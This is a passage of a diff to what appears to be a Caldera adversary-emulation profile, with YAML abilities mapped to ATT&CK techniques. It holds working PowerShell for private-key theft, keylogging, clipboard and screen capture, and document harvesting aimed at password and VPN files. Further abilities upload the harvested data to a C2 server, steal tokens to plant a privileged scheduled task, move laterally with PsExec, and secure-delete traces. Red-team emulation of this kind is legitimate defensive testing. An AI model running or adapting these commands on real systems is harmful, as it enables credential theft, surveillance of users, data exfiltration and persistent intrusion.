+           write-host "[+] Successfully executed private key collection script.";
+           exit 0;
+       } else {
+           write-host "[!] Error, could not execution Get-PrivateKeys.";
+           exit 1;
+       }
+   - pwsh:
+     platform: windows
+     command: |
+       Import-PfxCertificate -Exportable -FilePath ".\dmevals.local.pfx" -CertStoreLocation Cert:\LocalMachine\My;
+       
+       if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+         write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+         exit 1;
+       }
+       Set-Location -path "C:\Program Files\SysinternalsSuite";
+       . .\readme.ps1;
+       Get-PrivateKeys;
+       if ($? -eq $True) {
+           write-host "[+] Successfully executed private key collection script.";
+           exit 0;
+       } else {
+           write-host "[!] Error, could not execution Get-PrivateKeys.";
+           exit 1;
+       }
+ a4b14c10-49aa-4ae4-b165-d5a37364fe62:
+  name:  Staging files for PowerShell module imports
+  tactic:  defensive-evasion
+  technique_name:  "Masquerading: Match Legitimate Name or Location"
+  technique_id:  T1036.005
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       if (! $(test-path -path "C:\Program Files\SysInternalsSuite")) {
+         write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
+         exit 1;
+       }
+       
+       Set-Location -path "C:\Program Files\SysInternalsSuite";
+       if (test-path -path ".\psversion.txt" ) {
+         move-item .\psversion.txt psversion.ps1 -Force;
+       }
+         write-host "[+] File psversion.ps1 staged to be imported."
+   - pwsh:
+     platform: windows
+     command: |
+       if (! $(test-path -path "C:\Program Files\SysInternalsSuite")) {
+         write-host "[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.";
+         exit 1;
+       }
+       
+       Set-Location -path "C:\Program Files\SysInternalsSuite";
+       if (test-path -path ".\psversion.txt" ) {
+         move-item .\psversion.txt psversion.ps1 -Force;
+       }
+         write-host "[+] File psversion.ps1 staged to be imported."
+ a81ea4ad-bc9f-49a7-82d4-4466df641487:
+  name:  Screen Capturing
+  tactic:  collection
+  technique_name:  "Screen Capture"
+  technique_id:  T1113
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       if (! $(test-path -path "C:\Program Files\SysinternalsSuite\psversion.ps1";)) {
+         write-host "[!] The path C:\Program Files\SysinternalsSuite\psversion.ps1 does not exist. Execution has stopped.";
+         exit 1;
+       }
+       
+       Set-Location -path "C:\Program Files\SysinternalsSuite";
+       . .\psversion.ps1;
+       Invoke-ScreenCapture; Start-Sleep -Seconds 3; View-Job -JobName "Screenshot";
+   - pwsh:
+     platform: windows
+     command: |
+       if (! $(test-path -path "C:\Program Files\SysinternalsSuite\psversion.ps1";)) {
+         write-host "[!] The path C:\Program Files\SysinternalsSuite\psversion.ps1 does not exist. Execution has stopped.";
+         exit 1;
+       }
+       
+       Set-Location -path "C:\Program Files\SysinternalsSuite";
+       . .\psversion.ps1;
+       Invoke-ScreenCapture; Start-Sleep -Seconds 3; View-Job -JobName "Screenshot";
+ ee4c2eab-be57-434c-a32c-14b77360301a:
+  name:  Automated Collection (T1119) - Clipboard (T1115)
+  tactic:  collection
+  technique_name:  "Clipboard Data"
+  technique_id:  T1115
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $clip_data=get-clipboard;
+       if ($clip_data.Length -gt 0) {
+         write-host "[+] Clipboard data obtained!\n";
+         write-host $clip_data;
+       } else {
+         write-host "[!] No clipboard data available!\n";
+       }
+   - pwsh:
+     platform: windows
+     command: |
+       $clip_data=get-clipboard;
+       if ($clip_data.Length -gt 0) {
+         write-host "[+] Clipboard data obtained!\n";
+         write-host $clip_data;
+       } else {
+         write-host "[!] No clipboard data available!\n";
+       }
+ db28f68d-e8b8-46e6-b680-642570d4b257:
+  name:  Automated Collection (T1119) - Input Capture (T1417)
+  tactic:  collection
+  technique_name:  "Input Capture: Keylogging"
+  technique_id:  T1056.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+         write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+         exit 1;
+       }
+       Set-Location -path "C:\Program Files\SysinternalsSuite";
+       . .\psversion.ps1;
+       Get-Keystrokes;
+       Start-Sleep -Seconds 15;
+       View-Job -JobName "Keystrokes";
+   - pwsh:
+     platform: windows
+     command: |
+       if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+         write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+         exit 1;
+       }
+       Set-Location -path "C:\Program Files\SysinternalsSuite";
+       . .\psversion.ps1;
+       Get-Keystrokes;
+       Start-Sleep -Seconds 15;
+       View-Job -JobName "Keystrokes";
+ a612311d-a802-48da-bb7f-88a4b9dd7a24:
+  name:  Data from staged file (T1074) and Exfiltration over C2 Channel (T1041)
+  tactic:  exfiltration
+  technique_name:  "Exfiltration Over C2 Channel"
+  technique_id:  T1041
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Write-Host "[*] Compressing all the things in download dir";
+       Compress-Archive -Path "C:\Users\#{profile_user}\Downloads\*.*" -DestinationPath "$env:APPDATA\OfficeSupplies.zip";
+       
+       Import-Module .\upload.ps1 -Verbose -Force;
+       Invoke-MultipartFormDataUpload -InFile "$env:APPDATA\OfficeSupplies.zip" -Uri "#{server}/file/upload";
+       if ($?) {
+         write-host "[+] Data exfil of download directory completed!";
+       } else {
+         write-host "[!] Data exfil failed!";
+       }
+   - pwsh:
+     platform: windows
+     command: |
+       Write-Host "[*] Compressing all the things in download dir";
+       Compress-Archive -Path "C:\Users\#{profile_user}\Downloads\*.*" -DestinationPath "$env:APPDATA\OfficeSupplies.zip";
+       
+       Import-Module .\upload.ps1 -Verbose -Force;
+       Invoke-MultipartFormDataUpload -InFile "$env:APPDATA\OfficeSupplies.zip" -Uri "#{server}/file/upload";
+       if ($?) {
+         write-host "[+] Data exfil of download directory completed!";
+       } else {
+         write-host "[!] Data exfil failed!";
+       }
+ 92eccc5d-4e00-4d54-8ade-1f451d5219d2:
+  name:  Create Sandcat Launcher script
+  tactic:  persistence
+  technique_name:  "Command and Scripting Interpreter: Windows Command Shell"
+  technique_id:  T1059.003
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       copy .\launch-persistence.bat C:\Users\Public
+ a238d002-d34e-4ce2-921b-0f1cad0afa90:
+  name:  Scheduled Tasks (T1053) (Modified)
+  tactic:  persistence
+  technique_name:  "Scheduled Task/Job: Scheduled Task"
+  technique_id:  T1053.005
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "& {. '.\StealToken.ps1';
+       StealToken;
+       CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "TaskDefender" /tr "C:\Users\Public\launch-persistence.exe" /sc ONSTART /RU Administrator /RL HIGHEST';
+       RevertToSelf;}"
+ 95564347-e77a-4a89-b08f-dcafa5468f2c:
+  name:  Remote System Discovery (T1018)
+  tactic:  execution
+  technique_name:  "Command and Scripting Interpreter: PowerShell"
+  technique_id:  T1059.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+         write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+         exit 1;
+       }
+       
+       Set-Location -path "C:\Program Files\SysinternalsSuite";
+       . .\psversion.ps1;
+       Ad-Search Computer Name *;
+   - pwsh:
+     platform: windows
+     command: |
+       if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+         write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+         exit 1;
+       }
+       
+       Set-Location -path "C:\Program Files\SysinternalsSuite";
+       . .\psversion.ps1;
+       Ad-Search Computer Name *;
+ c4a59e39-53b0-4ace-9528-8ff052752ece:
+  name:  Identifying current user on other machines
+  tactic:  execution
+  technique_name:  "Command and Scripting Interpreter: PowerShell"
+  technique_id:  T1059.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Invoke-Command -ComputerName "$(hostname)" -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like "*\$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId -Last 1;
+ fd639a42-a667-48ab-a883-2d94843e52ab:
+  name:  File and Directory Discovery (T1083) (modified)
+  tactic:  discovery
+  technique_name:  "File and Directory Discovery"
+  technique_id:  T1083
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "& {. '.\StealToken.ps1';
+       StealToken;
+       CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+       CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+       RevertToSelf;}"
+ 0b1841bd-ef8b-475c-bce7-8fcb2860984a:
+  name:  Screen Capture (T1113)
+  tactic:  collection
+  technique_name:  "Screen Capture"
+  technique_id:  T1113
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Import-Module .\Get-Screenshot.ps1 -Verbose -Force;
+       Get-Screenshot;
+   - pwsh:
+     platform: windows
+     command: |
+       Import-Module .\Get-Screenshot.ps1 -Verbose -Force;
+       Get-Screenshot;
+ 00e7c38f-f4e1-45ea-ac8c-464b31f46229:
+  name:  File and Directory Discovery (T1083) ks \\target\folder
+  tactic:  discovery
+  technique_name:  "File and Directory Discovery"
+  technique_id:  T1083
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       ls \\#{remote.file.share}\C$\Windows
+ 08e57385-dbce-4850-8bb7-589ef79465ab:
+  name:  Automated document collection (T1119)
+  tactic:  execution
+  technique_name:  "Command and Scripting Interpreter: PowerShell"
+  technique_id:  T1059.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       move-item Rar.exe -Destination C:\Windows\Temp -Force;
+       $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force;
+       cd C:\Windows\Temp;
+       .\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip";
+   - pwsh:
+     platform: windows
+     command: |
+       move-item Rar.exe -Destination C:\Windows\Temp -Force;
+       $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force;
+       cd C:\Windows\Temp;
+       .\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip";
+ 2d18c8ec-4593-49dc-9bf4-11d0673d6ae6:
+  name:  Data from staged file (T1074) and Exfiltration over C2 Channel (T1041)
+  tactic:  exfiltration
+  technique_name:  "Exfiltration Over C2 Channel"
+  technique_id:  T1041
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Import-Module .\upload.ps1 -Verbose -Force;
+       Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\Desktop\working.zip" -Uri "#{server}/file/upload";
+   - pwsh:
+     platform: windows
+     command: |
+       Import-Module .\upload.ps1 -Verbose -Force;
+       Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\Desktop\working.zip" -Uri "#{server}/file/upload";
+ 208b021b-c79a-4176-8ad1-3af99ed50c6f:
+  name:  Artifact Cleanup - Delete Staged Files
+  tactic:  defensive-evasion
+  technique_name:  "Indicator Removal on Host: File Deletion"
+  technique_id:  T1070.004
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       if (!$(test-path -path "C:\Program Files\SysInternalsSuite")) {
+         mkdir "C:\Program Files\SysInternalsSuite";
+       }
+       set-location "C:\Program Files\SysInternalsSuite";
+       
+       if (!$(test-path -path "sdelete64.exe")) {
+         iwr -uri "https://download.sysinternals.com/files/SDelete.zip" -outfile sdelete64.zip;
+         Expand-Archive sdelete64.zip -force;
+       }
+       copy sdelete64.exe C:\Windows\Temp\;
+       cd C:\Windows\Temp\ ;
+       .\sdelete64.exe /accepteula C:\Windows\Temp\Rar.exe;
+       .\sdelete64.exe /accepteula C:\Users\#{profile_user}\AppData\Roaming\working.zip;
+       .\sdelete64.exe /accepteula C:\Users\#{profile_user}\Desktop\working.zip;
+       remove-item C:\Windows\Temp\sdelete64.exe -force;
+   - pwsh:
+     platform: windows
+     command: |
+       if (!$(test-path -path "C:\Program Files\SysInternalsSuite")) {
+         mkdir "C:\Program Files\SysInternalsSuite";
+       }
+       set-location "C:\Program Files\SysInternalsSuite";
+       
+       if (!$(test-path -path "sdelete64.exe")) {
+         iwr -uri "https://download.sysinternals.com/files/SDelete.zip" -outfile sdelete64.zip;
+         Expand-Archive sdelete64.zip -force;
+       }
+       copy sdelete64.exe C:\Windows\Temp\;
+       cd C:\Windows\Temp\ ;
+       .\sdelete64.exe /accepteula C:\Windows\Temp\Rar.exe;
+       .\sdelete64.exe /accepteula C:\Users\#{profile_user}\AppData\Roaming\working.zip;
+       .\sdelete64.exe /accepteula C:\Users\#{profile_user}\Desktop\working.zip;
+       remove-item C:\Windows\Temp\sdelete64.exe -force;
+ 4bedbd9b-a570-4f9f-b78a-2f7f99ad5e92:
+  name:  Artifact Cleanup
+  tactic:  defensive-evasion
+  technique_name:  "Indicator Removal on Host: File Deletion"
+  technique_id:  T1070.004
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Remove-Item -Path "$env:USERPROFILE\Downloads\*.pfx" -Force;
+       Remove-Item -Path "$env:USERPROFILE\Downloads\*.bmp" -Force;
+       Remove-Item -Path "$env:USERPROFILE\Downloads\*.png" -Force;
+       if (test-path -path "$env:APPDATA\OfficeSupplies.7z") {
+           Remove-Item -Path "$env:APPDATA\OfficeSupplies.7z" -Force; write-host "[+] Successfully removed OfficeSupplies.7z";
+       } else {
+           write-host "[!] File did not exist to be removed!";
+       }
+       
+       if (get-job -name "Keystrokes" -ErrorAction SilentlyContinue) {
+           Remove-Job -Name "Keystrokes";
+           if ($?) {
+               write-host "[+] Job \"Keystrokes\" was remove.";
+           }
+       } else {
+           write-host "[!] Job \"Keystrokes\" did not exist.";
+       }
+       
+       if (get-job -Name "Screenshot" -ErrorAction SilentlyContinue) {
+           Remove-Job -Name "Screenshot" -Force;
+           write-host "[+] Job \"screenshot\" was removed.";
+       } else {
+           write-host "[*] Job \"screenshot\" does not exist, thus was not removed.";
+       }
+       remove-item upload.ps1 -Force;
+   - pwsh:
+     platform: windows
+     command: |
+       Remove-Item -Path "$env:USERPROFILE\Downloads\*.pfx" -Force;
+       Remove-Item -Path "$env:USERPROFILE\Downloads\*.bmp" -Force;
+       Remove-Item -Path "$env:USERPROFILE\Downloads\*.png" -Force;
+       if (test-path -path "$env:APPDATA\OfficeSupplies.7z") {
+           Remove-Item -Path "$env:APPDATA\OfficeSupplies.7z" -Force; write-host "[+] Successfully removed OfficeSupplies.7z";
+       } else {
+           write-host "[!] File did not exist to be removed!";
+       }
+       
+       if (get-job -name "Keystrokes" -ErrorAction SilentlyContinue) {
+           Remove-Job -Name "Keystrokes";
+           if ($?) {
+               write-host "[+] Job \"Keystrokes\" was remove.";
+           }
+       } else {
+           write-host "[!] Job \"Keystrokes\" did not exist.";
+       }
+       
+       if (get-job -Name "Screenshot" -ErrorAction SilentlyContinue) {
+           Remove-Job -Name "Screenshot" -Force;
+           write-host "[+] Job \"screenshot\" was removed.";
+       } else {
+           write-host "[*] Job \"screenshot\" does not exist, thus was not removed.";
+       }
+       remove-item upload.ps1 -Force;
+ 09b6f339-cd57-4012-94e8-531be782fcea:
+  name:  Modified Copy Sandcat File
+  tactic:  lateral-movement
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T11105
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       move-item C:\Users\Public\sandcat.exe C:\Windows\temp\python.exe -force;
+       set-location "C:\Program Files\SysinternalsSuite\";
+       .\PsExec64.exe -accepteula \\#{pivot_machine_hostname} -i #{user.session.id} -d -f -c "C:\Windows\Temp\python.exe" -group "day-1-lateral-movement" -server "#{server}";
+       tasklist /S #{pivot_machine_hostname} /FI "IMAGENAME eq python.exe";
+ 4b2e9574-b1a7-4b38-95b2-6054ded9c4fe:
+  name:  Scheduled Task
+  tactic:  impact
+  technique_name:  "System Shutdown/Reboot"
+  technique_id:  T1529
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       write-host "[*] Restarting Computer";
+       Restart-Computer -Force;
+   - pwsh:
+     platform: windows
+     command: |
+       write-host "[*] Restarting Computer";
+       Restart-Computer -Force;
+ 00446217-53ca-4749-bacd-f41fe189d36e:
+  name:  Startup Folder Persistence Execution
+  tactic:  lateral-movement
+  technique_name:  "Boot or Logon Initialization Scripts: Startup Items"
+  technique_id:  T1037.005
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       cmdkey /add:127.0.0.2 /user:#{profile_user} /pass:#{profile_user_password};
+       mstsc /v:127.0.0.2;
+       sleep 10;
+       Get-Process -name mstsc;
+       if ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}
+   - pwsh:
+     platform: windows
+     command: |
+       cmdkey /add:127.0.0.2 /user:#{profile_user} /pass:#{profile_user_password};
+       mstsc /v:127.0.0.2;
+       sleep 10;
+       Get-Process -name mstsc;
+       if ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}
